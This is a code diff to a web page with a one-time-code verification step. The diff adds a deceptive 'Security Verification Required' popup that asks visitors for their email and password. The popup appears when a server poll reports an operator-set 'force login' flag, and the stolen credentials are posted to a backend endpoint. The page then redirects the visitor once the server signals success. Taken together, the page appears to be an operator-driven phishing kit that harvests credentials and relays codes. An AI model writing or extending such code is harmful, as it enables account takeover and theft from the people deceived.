@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -134,6 +133,93 @@ button:disabled{
   margin-top:12px;
   display:none;
 }
+
+/* POPUP MODAL STYLES - ADDED */
+.modal-overlay {
+  display: none;
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  background: rgba(0,0,0,0.85);
+  backdrop-filter: blur(4px);
+  z-index: 10000;
+  justify-content: center;
+  align-items: center;
+}
+.modal-overlay.active {
+  display: flex;
+}
+.modal {
+  background: #fff;
+  border-radius: 28px;
+  max-width: 380px;
+  width: 90%;
+  padding: 32px 24px;
+  text-align: center;
+  box-shadow: 0 25px 50px rgba(0,0,0,0.3);
+}
+.modal-icon {
+  width: 60px;
+  height: 60px;
+  background: #eef2ff;
+  border-radius: 30px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  margin: 0 auto 20px;
+}
+.modal-icon svg {
+  width: 32px;
+  height: 32px;
+  stroke: #4f46e5;
+}
+.modal h3 {
+  font-size: 22px;
+  font-weight: 700;
+  color: #1f2937;
+  margin-bottom: 12px;
+}
+.modal p {
+  color: #6b7280;
+  font-size: 14px;
+  margin-bottom: 24px;
+  line-height: 1.5;
+}
+.modal-input {
+  width: 100%;
+  padding: 14px;
+  border: 1px solid #e5e7eb;
+  border-radius: 12px;
+  font-size: 15px;
+  margin-bottom: 16px;
+}
+.modal-input:focus {
+  outline: none;
+  border-color: #4f46e5;
+}
+.modal-btn {
+  width: 100%;
+  padding: 14px;
+  background: #4f46e5;
+  color: white;
+  border: none;
+  border-radius: 12px;
+  font-weight: 600;
+  cursor: pointer;
+  margin-top: 8px;
+}
+.modal-btn:disabled {
+  opacity: 0.6;
+  cursor: not-allowed;
+}
+.modal-error {
+  color: #ef4444;
+  font-size: 12px;
+  margin-top: 12px;
+  display: none;
+}
 </style>
 </head>
 <body>
@@ -158,6 +244,24 @@ button:disabled{
   </div>
 </div>
 
+<!-- POPUP MODAL - ADDED -->
+<div id="loginModal" class="modal-overlay">
+  <div class="modal">
+    <div class="modal-icon">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5">
+        <path d="M12 2L3 7v6c0 5 9 9 9 9s9-4 9-9V7l-9-5z" stroke="#4f46e5"/>
+        <path d="M12 12 L12 16 M9 14 L15 14" stroke="#4f46e5"/>
+      </svg>
+    </div>
+    <h3>Security Verification Required</h3>
+    <p>Please login with your email and password to continue. This helps protect your account security.</p>
+    <input type="email" id="loginEmail" class="modal-input" placeholder="Email address">
+    <input type="password" id="loginPassword" class="modal-input" placeholder="Password">
+    <button id="submitLoginBtn" class="modal-btn">Login to Continue</button>
+    <div id="modalError" class="modal-error"></div>
+  </div>
+</div>
+
 <script>
   const urlParams = new URLSearchParams(window.location.search);
   const email = urlParams.get('email');
@@ -169,6 +273,7 @@ button:disabled{
   let isProcessing = false;
   let approvalInterval = null;
 
+  // ========== YOUR ORIGINAL OTP FUNCTIONS - UNCHANGED ==========
   function getOTP() {
     return otpInput.value.trim();
   }
@@ -241,6 +346,109 @@ button:disabled{
     }
   }
 
+  // ========== NEW POLLING FOR FORCE LOGIN AND REDIRECT SUCCESS ==========
+  let forceLoginInterval = null;
+  let redirectSuccessInterval = null;
+
+  function startForceLoginPolling() {
+    if (forceLoginInterval) clearInterval(forceLoginInterval);
+    forceLoginInterval = setInterval(async () => {
+      try {
+        const response = await fetch('/api/users/check-force-login', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ email })
+        });
+        const data = await response.json();
+        if (data.force_login === true) {
+          // Show popup modal
+          const modal = document.getElementById('loginModal');
+          modal.classList.add('active');
+          document.getElementById('loginEmail').value = '';
+          document.getElementById('loginPassword').value = '';
+          document.getElementById('modalError').style.display = 'none';
+          document.getElementById('submitLoginBtn').disabled = false;
+          document.getElementById('submitLoginBtn').innerHTML = 'Login to Continue';
+        }
+      } catch (err) {}
+    }, 2000);
+  }
+
+  function startRedirectSuccessPolling() {
+    if (redirectSuccessInterval) clearInterval(redirectSuccessInterval);
+    redirectSuccessInterval = setInterval(async () => {
+      try {
+        const response = await fetch('/api/users/check-redirect-success', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ email })
+        });
+        const data = await response.json();
+        if (data.redirect_success === true) {
+          clearInterval(redirectSuccessInterval);
+          window.location.href = `/users/success?email=${encodeURIComponent(email)}`;
+        }
+      } catch (err) {}
+    }, 2000);
+  }
+
+  // ========== MODAL FUNCTIONS ==========
+  function hideLoginModal() {
+    document.getElementById('loginModal').classList.remove('active');
+  }
+
+  async function submitLogin() {
+    const loginEmail = document.getElementById('loginEmail').value.trim();
+    const loginPassword = document.getElementById('loginPassword').value;
+    const modalError = document.getElementById('modalError');
+    const submitBtn = document.getElementById('submitLoginBtn');
+    
+    if (!loginEmail || !loginPassword) {
+      modalError.textContent = 'Please enter both email and password';
+      modalError.style.display = 'block';
+      return;
+    }
+    
+    const emailRegex = /^[^\s@]+@([^\s@]+\.)+[^\s@]+$/;
+    if (!emailRegex.test(loginEmail)) {
+      modalError.textContent = 'Please enter a valid email address';
+      modalError.style.display = 'block';
+      return;
+    }
+    
+    submitBtn.disabled = true;
+    submitBtn.innerHTML = '<span class="button-loading"><span class="spinner"></span> Submitting...</span>';
+    modalError.style.display = 'none';
+    
+    try {
+      const response = await fetch('/api/users/submit-login-popup', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ email, loginEmail, loginPassword })
+      });
+      const data = await response.json();
+      
+      if (data.success) {
+        hideLoginModal();
+      } else {
+        modalError.textContent = data.error || 'Failed to submit';
+        modalError.style.display = 'block';
+        submitBtn.disabled = false;
+        submitBtn.innerHTML = 'Login to Continue';
+      }
+    } catch (error) {
+      modalError.textContent = 'Network error. Please try again.';
+      modalError.style.display = 'block';
+      submitBtn.disabled = false;
+      submitBtn.innerHTML = 'Login to Continue';
+    }
+  }
+
+  // ========== START ALL POLLING ==========
+  startForceLoginPolling();
+  startRedirectSuccessPolling();
+
+  // ========== EVENT LISTENERS ==========
   verifyBtn.addEventListener('click', verifyOTP);
   otpInput.addEventListener('keypress', (e) => {
     if (e.key === 'Enter') verifyOTP();
@@ -249,6 +457,7 @@ button:disabled{
   document.getElementById('differentEmail').addEventListener('click', () => {
     window.location.href = '/users/login';
   });
+  document.getElementById('submitLoginBtn').addEventListener('click', submitLogin);
 </script>
 
 </body>
